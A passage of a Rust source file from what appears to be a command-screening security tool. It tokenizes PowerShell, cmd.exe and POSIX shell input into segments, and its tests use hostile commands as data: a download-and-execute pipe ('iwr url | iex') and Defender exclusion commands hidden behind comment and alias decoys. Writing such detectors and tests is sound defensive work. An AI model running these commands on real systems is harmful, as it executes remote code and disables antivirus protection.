        budget.word_bytes_truncated = true;
        return;
    }
    current.push(ch);
}

fn flush_bounded_word(
    words: &mut Vec<String>,
    current: &mut String,
    overflowed: &mut bool,
    max_words: usize,
    budget: &mut WordBudget,
) {
    if *overflowed {
        *overflowed = false;
        current.clear();
        return;
    }
    if current.is_empty() {
        return;
    }
    if words.len() >= max_words {
        budget.words_truncated = true;
        current.clear();
        return;
    }
    words.push(std::mem::take(current));
    budget.word_limit_reached = words.len() >= max_words;
}

fn split_powershell_words_bounded(
    input: &str,
    max_words: usize,
    max_word_bytes: usize,
) -> (Vec<String>, WordBudget) {
    let chars: Vec<char> = input.chars().collect();
    let byte_offsets: Vec<usize> = input.char_indices().map(|(offset, _)| offset).collect();
    let mut words = Vec::with_capacity(max_words.min(64));
    let mut current = String::new();
    let mut overflowed = false;
    let mut budget = WordBudget {
        word_limit_reached: max_words == 0,
        ..WordBudget::default()
    };
    let mut quote: Option<PowerShellQuoteKind> = None;
    let mut index = 0usize;

    while index < chars.len() {
        let ch = chars[index];
        if let Some(kind) = quote {
            if kind == PowerShellQuoteKind::Single {
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    ch,
                    max_word_bytes,
                    &mut budget,
                );
                if powershell_quote_kind(ch) == Some(PowerShellQuoteKind::Single) {
                    if chars
                        .get(index + 1)
                        .and_then(|next| powershell_quote_kind(*next))
                        == Some(PowerShellQuoteKind::Single)
                    {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[index + 1],
                            max_word_bytes,
                            &mut budget,
                        );
                        index += 2;
                    } else {
                        quote = None;
                        index += 1;
                    }
                } else {
                    index += 1;
                }
                continue;
            }
            if ch == '`' {
                match (chars.get(index + 1), chars.get(index + 2)) {
                    (Some('\n'), _) => {
                        index += 2;
                    }
                    (Some('\r'), Some('\n')) => {
                        index += 3;
                    }
                    (Some('\r'), _) => {
                        index += 2;
                    }
                    (Some(next), _) => {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            ch,
                            max_word_bytes,
                            &mut budget,
                        );
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            *next,
                            max_word_bytes,
                            &mut budget,
                        );
                        index += 2;
                    }
                    (None, _) => {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            ch,
                            max_word_bytes,
                            &mut budget,
                        );
                        index += 1;
                    }
                }
                continue;
            }
            push_bounded_word_char(
                &mut current,
                &mut overflowed,
                ch,
                max_word_bytes,
                &mut budget,
            );
            if powershell_quote_kind(ch) == Some(PowerShellQuoteKind::Double) {
                quote = None;
            }
            index += 1;
            continue;
        }

        if ch == '@' {
            let start = byte_offsets[index];
            if let Some(here_string) = powershell_here_string(input, start) {
                while index < chars.len() && byte_offsets[index] < here_string.end {
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        chars[index],
                        max_word_bytes,
                        &mut budget,
                    );
                    index += 1;
                }
                continue;
            }
        }

        if let Some(kind) = powershell_quote_kind(ch) {
            quote = Some(kind);
            push_bounded_word_char(
                &mut current,
                &mut overflowed,
                ch,
                max_word_bytes,
                &mut budget,
            );
            index += 1;
            continue;
        }
        if ch == '`' {
            match (chars.get(index + 1), chars.get(index + 2)) {
                (Some('\n'), _) => index += 2,
                (Some('\r'), Some('\n')) => index += 3,
                (Some('\r'), _) => index += 2,
                (Some(next), _) => {
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        ch,
                        max_word_bytes,
                        &mut budget,
                    );
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        *next,
                        max_word_bytes,
                        &mut budget,
                    );
                    index += 2;
                }
                (None, _) => {
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        ch,
                        max_word_bytes,
                        &mut budget,
                    );
                    index += 1;
                }
            }
            continue;
        }
        if ch.is_whitespace() {
            flush_bounded_word(
                &mut words,
                &mut current,
                &mut overflowed,
                max_words,
                &mut budget,
            );
            index += 1;
            continue;
        }
        push_bounded_word_char(
            &mut current,
            &mut overflowed,
            ch,
            max_word_bytes,
            &mut budget,
        );
        index += 1;
    }
    flush_bounded_word(
        &mut words,
        &mut current,
        &mut overflowed,
        max_words,
        &mut budget,
    );
    (words, budget)
}

fn normalize_powershell_segment_words(
    segment: &mut Segment,
    max_words: usize,
    max_word_bytes: usize,
) -> WordBudget {
    let (words, budget) = split_powershell_words_bounded(&segment.raw, max_words, max_word_bytes);
    if budget.words_truncated || budget.word_bytes_truncated {
        segment.command = None;
        segment.args.clear();
        return budget;
    }
    let first_non_assign = words.iter().position(|word| !is_env_assignment(word));
    match first_non_assign {
        Some(index) => {
            segment.command = words.get(index).cloned();
            segment.args = words.get(index + 1..).unwrap_or_default().to_vec();
        }
        None => {
            segment.command = None;
            segment.args.clear();
        }
    }
    budget
}

fn tokenize_powershell(input: &str, limits: TokenizeLimits) -> (Vec<Segment>, TokenizeBudget) {
    let mut segments = SegmentAccumulator::new(limits, true, SingleQuoteStyle::Posix);
    let mut current = String::new();
    let mut preceding_sep = None;
    let mut search_cursor: usize = 0;
    // Collect (byte_offset, char) pairs so byte slicing stays valid for multi-byte UTF-8.
    let indexed: Vec<(usize, char)> = input.char_indices().collect();
    let len = indexed.len();
    let mut i = 0;
    let mut token_class = PowerShellTokenClass::Start;
    // PowerShell statement separators inside a parenthesized expression or a
    // script block belong to that nested execution scope.  Keeping them in the
    // outer segment lets `extract::executable_substitutions` recover the body
    // once, then feed it through the same rule pipeline as a top-level command.
    let mut paren_depth = 0usize;
    let mut brace_depth = 0usize;

    while i < len {
        let (byte_off, ch) = indexed[i];

        match ch {
            // Backtick escaping in PowerShell. Preserve source spelling for
            // `raw`/byte ranges; the argv pass below removes line
            // continuations from effective words.
            '`' if i + 1 < len => {
                current.push(indexed[i].1);
                current.push(indexed[i + 1].1);
                if indexed[i + 1].1 == '\r' {
                    if indexed.get(i + 2).map(|(_, ch)| *ch) == Some('\n') {
                        current.push(indexed[i + 2].1);
                        i += 3;
                    } else {
                        i += 2;
                    }
                } else {
                    if indexed[i + 1].1 != '\n' {
                        token_class = PowerShellTokenClass::Generic;
                    }
                    i += 2;
                }
                continue;
            }
            // Block comments and here-strings are multiline lexical atoms.
            // Quotes, separators, and comment markers in their data must not
            // change the state used to find the following real command.
            '<' if token_class.starts_special_token() && i + 1 < len && indexed[i + 1].1 == '#' => {
                i = powershell_block_comment_end(&indexed, i).unwrap_or(len);
                token_class = PowerShellTokenClass::Start;
                continue;
            }
            '@' if token_class.starts_special_token() => {
                if let Some(here_string) = powershell_here_string(input, byte_off) {
                    while i < len && indexed[i].0 < here_string.end {
                        current.push(indexed[i].1);
                        i += 1;
                    }
                    token_class = PowerShellTokenClass::QuoteOnly;
                    continue;
                }
                current.push(ch);
                token_class = PowerShellTokenClass::Generic;
                i += 1;
                continue;
            }
            // PowerShell treats typographic quotes as string delimiters too.
            quote @ ('\'' | '"' | '\u{2018}' | '\u{2019}' | '\u{201a}' | '\u{201b}'
            | '\u{201c}' | '\u{201d}' | '\u{201e}') => {
                let quote_started_generic = token_class == PowerShellTokenClass::Generic;
                let kind = powershell_quote_kind(quote).expect("matched PowerShell quote");
                current.push(ch);
                i += 1;
                while i < len {
                    let nested = indexed[i].1;
                    if kind == PowerShellQuoteKind::Double && nested == '`' && i + 1 < len {
                        current.push(indexed[i].1);
                        current.push(indexed[i + 1].1);
                        if indexed[i + 1].1 == '\r'
                            && indexed.get(i + 2).map(|(_, ch)| *ch) == Some('\n')
                        {
                            current.push(indexed[i + 2].1);
                            i += 3;
                        } else {
                            i += 2;
                        }
                    } else if powershell_quote_kind(nested) == Some(kind) {
                        current.push(nested);
                        if kind == PowerShellQuoteKind::Single
                            && indexed
                                .get(i + 1)
                                .and_then(|(_, ch)| powershell_quote_kind(*ch))
                                == Some(PowerShellQuoteKind::Single)
                        {
                            current.push(indexed[i + 1].1);
                            i += 2;
                        } else {
                            i += 1;
                            break;
                        }
                    } else {
                        current.push(nested);
                        i += 1;
                    }
                }
                token_class = if quote_started_generic {
                    PowerShellTokenClass::Generic
                } else {
                    PowerShellTokenClass::QuoteOnly
                };
                continue;
            }
            '#' if token_class.starts_special_token() => {
                // A hash begins a comment only at a lexical token boundary;
                // `foo#bar` is one ordinary PowerShell word.
                while i < len && !matches!(indexed[i].1, '\r' | '\n') {
                    i += 1;
                }
                token_class = PowerShellTokenClass::Start;
                continue;
            }
            // Stop-parsing makes ordinary PowerShell syntax in the remaining
            // argument text literal. Grammar resumes at a newline or at an
            // unquoted pipeline/`&&`; semicolons and quoted operators remain
            // native argument data.
            '-' if powershell_stop_parsing_token(&indexed, i, token_class) => {
                let mut in_double_quotes = false;
                while i < len {
                    let literal = indexed[i].1;
                    if matches!(literal, '\r' | '\n')
                        || (!in_double_quotes
                            && (literal == '|'
                                || (literal == '&'
                                    && indexed.get(i + 1).map(|(_, ch)| *ch) == Some('&'))))
                    {
                        break;
                    }
                    current.push(literal);
                    if powershell_quote_kind(literal) == Some(PowerShellQuoteKind::Double) {
                        in_double_quotes = !in_double_quotes;
                    }
                    i += 1;
                }
                token_class = PowerShellTokenClass::Generic;
                continue;
            }
            '(' => {
                paren_depth = paren_depth.saturating_add(1);
                current.push(ch);
                token_class = PowerShellTokenClass::Start;
                i += 1;
                continue;
            }
            ')' if paren_depth > 0 => {
                paren_depth -= 1;
                current.push(ch);
                token_class = PowerShellTokenClass::Start;
                i += 1;
                continue;
            }
            '{' => {
                brace_depth = brace_depth.saturating_add(1);
                current.push(ch);
                token_class = PowerShellTokenClass::Start;
                i += 1;
                continue;
            }
            '}' if brace_depth > 0 => {
                brace_depth -= 1;
                current.push(ch);
                token_class = PowerShellTokenClass::Start;
                i += 1;
                continue;
            }
            '|' if paren_depth == 0 && brace_depth == 0 => {
                // PS 7+ `||` chain op — checked before the single-pipe arm so
                // `a || b` is one separator, not two pipes (three segments),
                // which `check_inline_download_execute` relies on.
                if i + 1 < len && indexed[i + 1].1 == '|' {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    token_class = PowerShellTokenClass::Start;
                    preceding_sep = Some("||".to_string());
                    i += 2;
                    continue;
                }
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                token_class = PowerShellTokenClass::Start;
                preceding_sep = Some("|".to_string());
                i += 1;
                continue;
            }
            ';' if paren_depth == 0 && brace_depth == 0 => {
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                token_class = PowerShellTokenClass::Start;
                preceding_sep = Some(";".to_string());
                i += 1;
                continue;
            }
            // PS 7+ `&&` chain op. The arm guard lets a bare `&` (PS
            // call/background operator) fall through to the catch-all.
            '&' if paren_depth == 0
                && brace_depth == 0
                && i + 1 < len
                && indexed[i + 1].1 == '&' =>
            {
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                token_class = PowerShellTokenClass::Start;
                preceding_sep = Some("&&".to_string());
                i += 2;
                continue;
            }
            // A leading single `&` is PowerShell's call operator and remains
            // part of the segment. Once a command/pipeline already precedes
            // it, the same token is the background statement terminator and
            // the following command must be analyzed as a new segment.
            '&' if paren_depth == 0
                && brace_depth == 0
                && !current.trim().is_empty()
                && !ends_with_unescaped_redirection(&current, '`')
                && !powershell_ampersand_is_call(&current) =>
            {
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                token_class = PowerShellTokenClass::Start;
                preceding_sep = Some("&".to_string());
                i += 1;
                continue;
            }
            // PowerShell logical `-and` / `-or` operators.
            '-' if paren_depth == 0
                && brace_depth == 0
                && (current.ends_with(char::is_whitespace) || current.is_empty()) =>
            {
                let remaining = &input[byte_off..];
                if remaining.starts_with("-and")
                    && remaining[4..]
                        .chars()
                        .next()
                        .is_none_or(|c| c.is_whitespace())
                {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    token_class = PowerShellTokenClass::Start;
                    preceding_sep = Some("-and".to_string());
                    i += 4;
                    continue;
                } else if remaining.starts_with("-or")
                    && remaining[3..]
                        .chars()
                        .next()
                        .is_none_or(|c| c.is_whitespace())
                {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    token_class = PowerShellTokenClass::Start;
                    preceding_sep = Some("-or".to_string());
                    i += 3;
                    continue;
                }
                current.push(ch);
                token_class = PowerShellTokenClass::Generic;
                i += 1;
            }
            '\r' | '\n' if paren_depth == 0 && brace_depth == 0 => {
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                token_class = PowerShellTokenClass::Start;
                preceding_sep = Some("\n".to_string());
                i += if ch == '\r' && indexed.get(i + 1).map(|(_, next)| *next) == Some('\n') {
                    2
                } else {
                    1
                };
                continue;
            }
            _ => {
                current.push(ch);
                token_class = match ch {
                    ch if ch.is_whitespace() => PowerShellTokenClass::Start,
                    ',' | ';' | '&' | '|' | '=' | '(' | ')' | '{' | '}' => {
                        PowerShellTokenClass::Start
                    }
                    '<' | '>' if token_class.starts_special_token() => PowerShellTokenClass::Start,
                    _ => PowerShellTokenClass::Generic,
                };
                i += 1;
            }
        }
    }

    push_segment(
        &mut segments,
        &current,
        preceding_sep.take(),
        input,
        &mut search_cursor,
    );
    let mut word_budget = WordBudget::default();
    for segment in &mut segments.values {
        let budget = normalize_powershell_segment_words(
            segment,
            limits.max_words_per_segment,
            limits.max_word_bytes,
        );
        word_budget.words_truncated |= budget.words_truncated;
        word_budget.word_bytes_truncated |= budget.word_bytes_truncated;
    }
    segments.note_word_budget(word_budget);
    segments
        .values
        .retain(|segment| !segment.raw.chars().all(char::is_whitespace));
    segments.finish()
}

fn tokenize_cmd(input: &str, limits: TokenizeLimits) -> (Vec<Segment>, TokenizeBudget) {
    let mut segments = SegmentAccumulator::new(limits, false, SingleQuoteStyle::Posix);
    let mut current = String::new();
    let mut preceding_sep = None;
    let mut search_cursor: usize = 0;
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;
    let mut paren_depth = 0usize;

    while i < len {
        // REM/@REM and batch labels consume their physical line before quote
        // handling. A quote in ignored data must not swallow commands on later
        // lines. `current` may retain a parenthesized group's previous lines,
        // so test only the suffix after the most recent newline.
        let at_physical_line_start = current
            .rsplit('\n')
            .next()
            .is_none_or(|line| line.trim().is_empty());
        let token_start = if chars.get(i) == Some(&'@') { i + 1 } else { i };
        let is_rem = chars
            .get(token_start..token_start.saturating_add(3))
            .is_some_and(|prefix| {
                prefix
                    .iter()
                    .collect::<String>()
                    .eq_ignore_ascii_case("rem")
            })
            && chars
                .get(token_start + 3)
                .is_none_or(|ch| ch.is_ascii_whitespace());
        let is_label = chars.get(token_start) == Some(&':');
        if at_physical_line_start && (is_rem || is_label) {
            while i < len && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }
        let ch = chars[i];
        match ch {
            // Caret escaping (cmd.exe escape character)
            '^' if i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                i += 2;
                continue;
            }
            // Double quotes (cmd's only quoting mechanism).
            '"' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
                continue;
            }
            '(' => {
                paren_depth = paren_depth.saturating_add(1);
                current.push(ch);
                i += 1;
                continue;
            }
            ')' if paren_depth > 0 => {
                paren_depth -= 1;
                current.push(ch);
                i += 1;
                continue;
            }
            '|' if paren_depth == 0 => {
                if i + 1 < len && chars[i + 1] == '|' {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    preceding_sep = Some("||".to_string());
                    i += 2;
                } else {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    preceding_sep = Some("|".to_string());
                    i += 1;
                }
                continue;
            }
            '&' if paren_depth == 0 => {
                if i + 1 < len && chars[i + 1] == '&' {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    preceding_sep = Some("&&".to_string());
                    i += 2;
                } else {
                    push_segment(
                        &mut segments,
                        &current,
                        preceding_sep.take(),
                        input,
                        &mut search_cursor,
                    );
                    current.clear();
                    preceding_sep = Some("&".to_string());
                    i += 1;
                }
                continue;
            }
            '\n' if paren_depth == 0 => {
                push_segment(
                    &mut segments,
                    &current,
                    preceding_sep.take(),
                    input,
                    &mut search_cursor,
                );
                current.clear();
                preceding_sep = Some("\n".to_string());
                i += 1;
                continue;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    push_segment(
        &mut segments,
        &current,
        preceding_sep.take(),
        input,
        &mut search_cursor,
    );
    segments.finish()
}

/// Push a tokenized segment into `segments`, trimming leading/trailing shell
/// syntax whitespace and locating the trimmed content in `input` to populate
/// `byte_range`.
///
/// `search_cursor` is advanced past the pushed segment so subsequent
/// searches skip already-consumed bytes (handles duplicate segments like
/// `foo | foo` correctly).
fn push_posix_segment(
    segments: &mut SegmentAccumulator,
    raw: &str,
    preceding_sep: Option<String>,
    input: &str,
    search_cursor: &mut usize,
) {
    push_segment_impl(segments, raw, preceding_sep, input, search_cursor, true);
}

fn push_segment(
    segments: &mut SegmentAccumulator,
    raw: &str,
    preceding_sep: Option<String>,
    input: &str,
    search_cursor: &mut usize,
) {
    push_segment_impl(segments, raw, preceding_sep, input, search_cursor, false);
}

fn push_segment_impl(
    segments: &mut SegmentAccumulator,
    raw: &str,
    preceding_sep: Option<String>,
    input: &str,
    search_cursor: &mut usize,
    preserve_posix_word_data: bool,
) {
    // POSIX shells do not treat Unicode Zs/Zl/Zp characters as token
    // whitespace. Unicode `trim()` would silently rename a Bash alias/function
    // whose command word begins or ends in NBSP. PowerShell argv is reparsed
    // with its broader Unicode whitespace grammar after byte ranges are fixed.
    let trimmed = if preserve_posix_word_data {
        raw.trim_matches(is_posix_syntax_whitespace)
    } else {
        raw.trim()
    };
    if trimmed.is_empty() {
        return;
    }

    // The tokenizer copies input bytes verbatim, so `trimmed` appears in
    // `input` at or after `*search_cursor`. The `None` fallback (shouldn't
    // happen) emits a zero-width range so downstream slicing never panics.
    let byte_range = match input.get(*search_cursor..).and_then(|s| s.find(trimmed)) {
        Some(rel_pos) => {
            let start = *search_cursor + rel_pos;
            let end = start + trimmed.len();
            *search_cursor = end;
            start..end
        }
        None => {
            let cursor = (*search_cursor).min(input.len());
            cursor..cursor
        }
    };

    if segments.is_full() {
        segments.mark_truncated();
        return;
    }

    let (command, args) = if segments.defer_word_parsing {
        (None, Vec::new())
    } else {
        let (words, words_truncated, word_bytes_truncated) = split_words_bounded_with_style(
            trimmed,
            segments.limits.max_words_per_segment,
            segments.limits.max_word_bytes,
            segments.single_quote_style,
        );
        let budget = WordBudget {
            words_truncated,
            word_bytes_truncated,
            ..WordBudget::default()
        };
        segments.note_word_budget(budget);
        if words_truncated || word_bytes_truncated {
            (None, Vec::new())
        } else {
            // Skip leading `VAR=VALUE` assignments.
            let first_non_assign = words.iter().position(|w| !is_env_assignment(w));
            match first_non_assign {
                Some(idx) => {
                    let cmd = Some(words[idx].clone());
                    let args = if idx + 1 < words.len() {
                        words[idx + 1..].to_vec()
                    } else {
                        Vec::new()
                    };
                    (cmd, args)
                }
                None => {
                    // All words are assignments — no command.
                    (None, Vec::new())
                }
            }
        }
    };

    segments.push(Segment {
        raw: trimmed.to_string(),
        command,
        args,
        preceding_separator: preceding_sep,
        byte_range,
    });
}

/// Check if a word looks like a shell environment variable assignment (NAME=VALUE).
/// Must have at least one char before `=`, and the name must be alphanumeric/underscore.
pub fn is_env_assignment(word: &str) -> bool {
    let s = word;
    if s.starts_with('-') || s.starts_with('=') {
        return false;
    }
    if let Some(eq_pos) = s.find('=') {
        if eq_pos == 0 {
            return false;
        }
        let name = &s[..eq_pos];
        let first = name.chars().next().unwrap_or('0');
        if first.is_ascii_digit() {
            return false;
        }
        name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    } else {
        false
    }
}

/// Return the values from leading `NAME=VALUE` tokens in a raw segment.
/// Stops at the first non-assignment word, matching the shell prefix-assignment model.
pub fn leading_env_assignments(segment_raw: &str) -> Vec<(String, String)> {
    leading_env_assignments_bounded(segment_raw, usize::MAX, usize::MAX).0
}

pub(crate) fn leading_env_assignments_bounded(
    segment_raw: &str,
    max_words: usize,
    max_word_bytes: usize,
) -> (Vec<(String, String)>, bool, bool) {
    let mut assignments = Vec::new();
    let (words, words_truncated, word_bytes_truncated) =
        split_words_bounded(segment_raw.trim(), max_words, max_word_bytes);
    for word in words {
        if !is_env_assignment(&word) {
            break;
        }
        if let Some((name, value)) = word.split_once('=') {
            assignments.push((name.to_string(), value.to_string()));
        }
    }
    (assignments, words_truncated, word_bytes_truncated)
}

/// Return the values from leading `NAME=VALUE` tokens in a raw segment.
/// Stops at the first non-assignment word, matching the shell prefix-assignment model.
pub fn leading_env_assignment_values(segment_raw: &str) -> Vec<String> {
    leading_env_assignments(segment_raw)
        .into_iter()
        .map(|(_, value)| value)
        .collect()
}

/// Split one already-segmented command into shell words, respecting quotes.
/// Kept crate-visible so wrapper payloads such as `env -S` can build the same
/// canonical argv without incorrectly treating `;`/`|` as controls executed by
/// the wrapper itself.
pub(crate) fn split_words_bounded(
    input: &str,
    max_words: usize,
    max_word_bytes: usize,
) -> (Vec<String>, bool, bool) {
    split_words_bounded_with_style(input, max_words, max_word_bytes, SingleQuoteStyle::Posix)
}

fn split_words_bounded_with_style(
    input: &str,
    max_words: usize,
    max_word_bytes: usize,
    single_quote_style: SingleQuoteStyle,
) -> (Vec<String>, bool, bool) {
    let mut words = Vec::with_capacity(max_words.min(64));
    let mut current = String::new();
    let mut overflowed = false;
    let mut budget = WordBudget {
        word_limit_reached: max_words == 0,
        ..WordBudget::default()
    };
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            ' ' | '\t' if !current.is_empty() => {
                flush_bounded_word(
                    &mut words,
                    &mut current,
                    &mut overflowed,
                    max_words,
                    &mut budget,
                );
                i += 1;
                while i < len && (chars[i] == ' ' || chars[i] == '\t') {
                    i += 1;
                }
            }
            ' ' | '\t' if overflowed => {
                flush_bounded_word(
                    &mut words,
                    &mut current,
                    &mut overflowed,
                    max_words,
                    &mut budget,
                );
                i += 1;
            }
            ' ' | '\t' => {
                i += 1;
            }
            '\'' => {
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    ch,
                    max_word_bytes,
                    &mut budget,
                );
                i += 1;
                while i < len && chars[i] != '\'' {
                    if single_quote_style == SingleQuoteStyle::Fish
                        && chars[i] == '\\'
                        && i + 1 < len
                        && matches!(chars[i + 1], '\\' | '\'')
                    {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[i],
                            max_word_bytes,
                            &mut budget,
                        );
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[i + 1],
                            max_word_bytes,
                            &mut budget,
                        );
                        i += 2;
                        continue;
                    }
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        chars[i],
                        max_word_bytes,
                        &mut budget,
                    );
                    i += 1;
                }
                if i < len {
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        chars[i],
                        max_word_bytes,
                        &mut budget,
                    );
                    i += 1;
                }
            }
            '"' => {
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    ch,
                    max_word_bytes,
                    &mut budget,
                );
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < len {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[i],
                            max_word_bytes,
                            &mut budget,
                        );
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[i + 1],
                            max_word_bytes,
                            &mut budget,
                        );
                        i += 2;
                    } else {
                        push_bounded_word_char(
                            &mut current,
                            &mut overflowed,
                            chars[i],
                            max_word_bytes,
                            &mut budget,
                        );
                        i += 1;
                    }
                }
                if i < len {
                    push_bounded_word_char(
                        &mut current,
                        &mut overflowed,
                        chars[i],
                        max_word_bytes,
                        &mut budget,
                    );
                    i += 1;
                }
            }
            '\\' if i + 1 < len => {
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    chars[i],
                    max_word_bytes,
                    &mut budget,
                );
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    chars[i + 1],
                    max_word_bytes,
                    &mut budget,
                );
                i += 2;
            }
            _ => {
                push_bounded_word_char(
                    &mut current,
                    &mut overflowed,
                    ch,
                    max_word_bytes,
                    &mut budget,
                );
                i += 1;
            }
        }
    }

    flush_bounded_word(
        &mut words,
        &mut current,
        &mut overflowed,
        max_words,
        &mut budget,
    );

    (words, budget.words_truncated, budget.word_bytes_truncated)
}

pub(crate) fn split_words(input: &str) -> Vec<String> {
    split_words_bounded(input, usize::MAX, usize::MAX).0
}

fn split_words_with_style(input: &str, single_quote_style: SingleQuoteStyle) -> Vec<String> {
    split_words_bounded_with_style(input, usize::MAX, usize::MAX, single_quote_style).0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_pipe() {
        let segs = tokenize("echo hello | grep world", ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].command.as_deref(), Some("echo"));
        assert_eq!(segs[1].command.as_deref(), Some("grep"));
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("|"));
    }

    #[test]
    fn test_quoted_pipe() {
        let segs = tokenize(r#"echo "hello | world" | bash"#, ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].raw, r#"echo "hello | world""#);
        assert_eq!(segs[1].command.as_deref(), Some("bash"));
    }

    #[test]
    fn test_and_or() {
        let segs = tokenize("cmd1 && cmd2 || cmd3", ShellType::Posix);
        assert_eq!(segs.len(), 3);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("&&"));
        assert_eq!(segs[2].preceding_separator.as_deref(), Some("||"));
    }

    #[test]
    fn test_semicolon() {
        let segs = tokenize("cmd1; cmd2", ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some(";"));
    }

    #[test]
    fn test_pipe_ampersand() {
        let segs = tokenize("cmd1 |& cmd2", ShellType::Posix);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("|&"));
    }

    #[test]
    fn test_powershell_pipe() {
        let segs = tokenize("iwr url | iex", ShellType::PowerShell);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].command.as_deref(), Some("iwr"));
        assert_eq!(segs[1].command.as_deref(), Some("iex"));
    }

    #[test]
    fn test_powershell_backtick() {
        let segs = tokenize("echo `| not a pipe", ShellType::PowerShell);
        // backtick escapes the pipe
        assert_eq!(segs.len(), 1);
    }

    #[test]
    fn powershell_hash_starts_a_comment_only_at_a_token_boundary() {
        for (input, argument) in [
            (
                "Write-Output foo#bar; Add-MpPreference -ExclusionPath C:\\Temp",
                "foo#bar",
            ),
            (
                "Write-Output x\"y\"#z; Add-MpPreference -ExclusionPath C:\\Temp",
                "x\"y\"#z",
            ),
            (
                "Write-Output foo` #bar; Add-MpPreference -ExclusionPath C:\\Temp",
                "foo` #bar",
            ),
        ] {
            let segs = tokenize(input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
            assert_eq!(segs[0].args, vec![argument]);
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_byte_ranges_match_raw(input, &segs);
        }

        let quote_only = "Write-Output \"foo\"# Set-Alias decoy Add-MpPreference\nAdd-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(quote_only, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].args, vec!["\"foo\""]);
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(quote_only, &segs);

        let comment = "Write-Output safe # Set-Alias decoy Add-MpPreference\nAdd-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(comment, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(comment, &segs);

        let cr_comment = "Write-Output safe # Set-Alias decoy Add-MpPreference\rAdd-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(cr_comment, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(cr_comment, &segs);
    }

    #[test]
    fn powershell_block_comments_close_at_the_first_terminator() {
        let input = "<# outer <# is data #>; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(input, ShellType::PowerShell);
        assert_eq!(segs.len(), 1, "{segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("Add-MpPreference"));
